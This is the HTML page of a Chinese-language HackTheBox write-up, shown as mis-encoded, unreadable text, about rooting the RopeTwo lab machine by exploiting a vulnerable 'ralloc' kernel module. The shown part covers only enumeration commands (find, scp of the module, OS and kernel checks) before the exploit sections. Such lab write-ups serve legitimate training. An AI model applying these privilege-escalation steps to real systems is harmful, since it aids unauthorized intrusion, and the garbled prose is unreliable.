<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="å‰è¨€æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–rootæƒé™çš„ralloc KASLR linuxå†…æ ¸å †ROPåˆ©ç”¨éƒ¨åˆ†ã€‚  åˆ°è¿™ä¸€æ­¥ä¹‹å‰ï¼Œå»ºè®®å…ˆçœ‹å‰ä¸¤ä¸ªæ­¥éª¤: HackTheBox-RopeTwo-[PWN-Chrome-V8å¼•æ“] HackTheBox-RopeTwo-[pwn-rshell]  æœ¬ç¯‡æ–‡ç« æ˜¯hackthebox - ropetwoæœºå™¨çš„æœ€åä¸€ä¸ªéƒ¨åˆ†, è¿›">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="å‰è¨€æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–rootæƒé™çš„ralloc KASLR linuxå†…æ ¸å †ROPåˆ©ç”¨éƒ¨åˆ†ã€‚  åˆ°è¿™ä¸€æ­¥ä¹‹å‰ï¼Œå»ºè®®å…ˆçœ‹å‰ä¸¤ä¸ªæ­¥éª¤: HackTheBox-RopeTwo-[PWN-Chrome-V8å¼•æ“] HackTheBox-RopeTwo-[pwn-rshell]  æœ¬ç¯‡æ–‡ç« æ˜¯hackthebox - ropetwoæœºå™¨çš„æœ€åä¸€ä¸ªéƒ¨åˆ†, è¿›">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot3.jpg">
<meta property="article:published_time" content="2021-02-26T18:37:37.000Z">
<meta property="article:modified_time" content="2021-02-27T23:07:47.272Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/","path":"2021/02/27/hackthebox-rope2-getroot/","title":"HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">54</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">212</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.</span> <span class="nav-text">æšä¸¾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE"><span class="nav-number">3.</span> <span class="nav-text">æœ¬åœ°é…ç½®</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BAVM"><span class="nav-number">3.1.</span> <span class="nav-text">æ­å»ºVM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85ralloc"><span class="nav-number">3.2.</span> <span class="nav-text">å®‰è£…ralloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-number">3.3.</span> <span class="nav-text">gdb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">é™æ€åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E7%BB%93%E6%9E%84"><span class="nav-number">4.1.</span> <span class="nav-text">é€šç”¨ç»“æ„</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IOCTL"><span class="nav-number">4.2.</span> <span class="nav-text">IOCTL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%84"><span class="nav-number">4.3.</span> <span class="nav-text">ç»“æ„</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rope2-ioctl"><span class="nav-number">4.4.</span> <span class="nav-text">rope2_ioctl</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BD%9C%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">åŸºæœ¬ç›¸äº’ä½œç”¨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#KASLR-Defeat"><span class="nav-number">6.</span> <span class="nav-text">KASLR Defeat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%96%E7%95%A5"><span class="nav-number">6.1.</span> <span class="nav-text">ç­–ç•¥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="nav-number">6.2.</span> <span class="nav-text">å®ç°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6RIP"><span class="nav-number">7.</span> <span class="nav-text">æ§åˆ¶RIP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%96%E7%95%A5-1"><span class="nav-number">7.1.</span> <span class="nav-text">ç­–ç•¥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0-1"><span class="nav-number">7.2.</span> <span class="nav-text">å®ç°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP"><span class="nav-number">8.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E4%B8%AD%E6%9E%A2"><span class="nav-number">8.1.</span> <span class="nav-text">å †æ ˆä¸­æ¢</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90"><span class="nav-number">8.2.</span> <span class="nav-text">æƒé™</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-1"><span class="nav-number">8.3.</span> <span class="nav-text">ROP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91"><span class="nav-number">8.4.</span> <span class="nav-text">è§¦å‘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">9.</span> <span class="nav-text">shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Extra-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%8E%B7%E5%8F%96root%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">10.</span> <span class="nav-text">Extra - éé¢„æœŸè·å–rootçš„æ–¹æ³•</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">10.1.</span> <span class="nav-text">å¯»æ‰¾æ¼æ´</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E6%97%A7%E7%9A%84apport"><span class="nav-number">11.</span> <span class="nav-text">å®‰è£…æ—§çš„apport</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">12.</span> <span class="nav-text">exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">12.1.</span> <span class="nav-text">èƒŒæ™¯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0"><span class="nav-number">12.2.</span> <span class="nav-text">ç»ƒä¹ </span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">212</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">54</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail â†’ mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page â†’ https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vQGZkdm9pZDA=" title="YouTube â†’ https:&#x2F;&#x2F;www.youtube.com&#x2F;@fdvoid0"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram â†’ https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange â†’ https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">è®°å¿†é‡Œçš„çº¯çœŸ</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">å°ç¦»</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-02-27 02:37:37" itemprop="dateCreated datePublished" datetime="2021-02-27T02:37:37+08:00">2021-02-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-02-28 07:07:47" itemprop="dateModified" datetime="2021-02-28T07:07:47+08:00">2021-02-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
        </span>
          , 
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">é€†å‘</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>6.9k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>25 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ­¤ç¯‡æ–‡ç« ä¸“é—¨è®°å½•hack the box - ropetwoæœºå™¨ä¸­è·å–rootæƒé™çš„ralloc KASLR linuxå†…æ ¸å †ROPåˆ©ç”¨éƒ¨åˆ†ã€‚</p>
<ul>
<li>åˆ°è¿™ä¸€æ­¥ä¹‹å‰ï¼Œå»ºè®®å…ˆçœ‹å‰ä¸¤ä¸ªæ­¥éª¤:</li>
<li><a href="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/">HackTheBox-RopeTwo-[PWN-Chrome-V8å¼•æ“]</a></li>
<li><a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">HackTheBox-RopeTwo-[pwn-rshell]</a></li>
</ul>
<p>æœ¬ç¯‡æ–‡ç« æ˜¯hackthebox - ropetwoæœºå™¨çš„æœ€åä¸€ä¸ªéƒ¨åˆ†, è¿›è¡Œå†…æ ¸è°ƒè¯•æ¼æ´åˆ©ç”¨ã€‚</p>
<span id="more"></span>

<h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h2><p>å½“åœ¨å¯»æ‰¾ä»chromeuserå‡çº§åˆ°r4jçš„æ–¹æ³•æ—¶ï¼Œè¿è¡Œäº†ä¸€ä¸ªfindæŸ¥è¯¢æ¥æŸ¥æ‰¾r4jæ‹¥æœ‰çš„æ–‡ä»¶ã€‚åœ¨ä¸Šé¢å±•ç¤ºäº†å¯¹è¯¥ç”¨æˆ·æ‹¥æœ‰çš„æ–‡ä»¶çš„æœç´¢ï¼Œå¯¹r4jç»„æ‹¥æœ‰çš„æ–‡ä»¶çš„æœç´¢è¿˜è¿”å›äº†ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ find / -<span class="built_in">type</span> f -group r4j -<span class="built_in">ls</span> 2&gt;/dev/null | grep -v -e <span class="string">&quot; \/proc&quot;</span> -e <span class="string">&quot; \/sys&quot;</span></span><br><span class="line">  1054414      8 -rw-r-----   1 root     r4j          5856 Jun  1  2020 /usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko</span><br><span class="line">  1056436     16 -rwsr-xr-x   1 r4j      r4j         14312 Feb 24  2020 /usr/bin/rshell</span><br><span class="line">  1054405      4 -rwx------   1 r4j      r4j          3771 Apr  4  2019 /home/r4j/.bashrc</span><br><span class="line">  1056441      4 -rw-r-----   1 root     r4j            33 Feb 26 17:52 /home/r4j/user.txt</span><br><span class="line">  1054406      4 -rwx------   1 r4j      r4j           807 Apr  4  2019 /home/r4j/.profile</span><br><span class="line">  1054407      4 -rwx------   1 r4j      r4j           220 Apr  4  2019 /home/r4j/.bash_logout</span><br><span class="line">  1054423      0 -rw-r--r--   1 r4j      r4j             0 Feb 23  2020 /home/r4j/.cache/motd.legal-displayed</span><br></pre></td></tr></table></figure>

<p>ralloc.koæ˜¯ä¸€ä¸ªå†…æ ¸æ¨¡å—ã€‚åœ¨&#x2F;devä¸­æœ‰ä¸€ä¸ªåŒ¹é…çš„è®¾å¤‡:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:/dev$ <span class="built_in">ls</span> -l ralloc</span><br><span class="line">crw-r--r-- 1 root root 10, 52 Feb 26 17:52 ralloc</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨scpè·å–æ¨¡å—çš„å‰¯æœ¬:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># scp -i id_rsa r4j@10.10.10.196:/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko .</span></span><br><span class="line">ralloc.ko                                                                                                          100% 5856    20.2KB/s   00:00    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># ls</span></span><br><span class="line">chrome  gdb-rshell.init  id_rsa.pub            libc-2.29.so-debug                 libc.so.6-ropetwo  pwn_rshell.py  rshell    xpl.js</span><br><span class="line">exp.py  id_rsa           ld-linux-x86-64.so.2  libc6-dbg_2.29-0ubuntu2_amd64.deb  patch.diff         ralloc.ko      xpl.html</span><br></pre></td></tr></table></figure>

<p>è¿˜éœ€è¦ä¸€äº›å…³äºRopeTwoçš„é¢å¤–ä¿¡æ¯ï¼Œä»¥ä¾¿å¤åˆ¶ç¯å¢ƒã€‚æ“ä½œç³»ç»Ÿå’Œå†…æ ¸ç‰ˆæœ¬:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ <span class="built_in">cat</span> /etc/lsb-release</span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=19.04</span><br><span class="line">DISTRIB_CODENAME=disco</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 19.04&quot;</span></span><br><span class="line">r4j@rope2:~$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux rope2 5.0.0-38-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å†…æ ¸æ­£åœ¨è¿è¡Œçš„ä¿æŠ¤ï¼ŒæŸ¥çœ‹&#x2F;proc&#x2F;cpuinfoã€‚å¯¹äºæ¯ä¸ªå¤„ç†å™¨ï¼Œéƒ½çœ‹åˆ°äº†flag smepï¼Œå®ƒä»£è¡¨<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU3VwZXJ2aXNvcl9Nb2RlX0FjY2Vzc19QcmV2ZW50aW9u">ç›‘ç£æ¨¡å¼æ‰§è¡Œä¿æŠ¤<i class="fa fa-external-link-alt"></i></span>ã€‚è¿™æ„å‘³ç€ä¸èƒ½åœ¨å†…æ ¸ä¸­è¿è¡Œç”¨æˆ·ç©ºé—´ä»£ç ã€‚ç›¸åï¼Œéœ€è¦åœ¨æ¼æ´å¼€å‘åˆ©ç”¨è¿‡ç¨‹ä¸­ä½¿ç”¨ROPæ¥å®ç°ç›®æ ‡ã€‚</p>
<h2 id="æœ¬åœ°é…ç½®"><a href="#æœ¬åœ°é…ç½®" class="headerlink" title="æœ¬åœ°é…ç½®"></a>æœ¬åœ°é…ç½®</h2><p>å› ä¸ºå†…æ ¸æ¨¡å—æ˜¯ç‰¹å®šäºå†…æ ¸çš„ï¼Œæ‰€ä»¥æƒ³åœ¨æœ¬åœ°VMä¸­åˆ›å»ºç›¸åŒçš„ç¯å¢ƒã€‚è¦è®¿é—®Linuxä¸»æœºï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨QEMUã€‚è¿™ç¯‡<span class="exturl" data-url="aHR0cHM6Ly93d3cubnVsbGJ5dGUuY2F0L3Bvc3QvbGludXgta2VybmVsLWV4cGxvaXQtZGV2ZWxvcG1lbnQtZW52aXJvbm1lbnQvI2Vudmlyb25tZW50LXNldHVw">åšæ–‡<i class="fa fa-external-link-alt"></i></span>è¯¦ç»†ä»‹ç»äº†è¿™ä¸ªè¿‡ç¨‹ï¼Œä½†æ˜¯æœ¬ç¯‡æ–‡ç« ä½¿ç”¨ubuntu 19.04 vmè™šæ‹Ÿæœºç³»ç»Ÿæ¥è°ƒè¯•ã€‚</p>
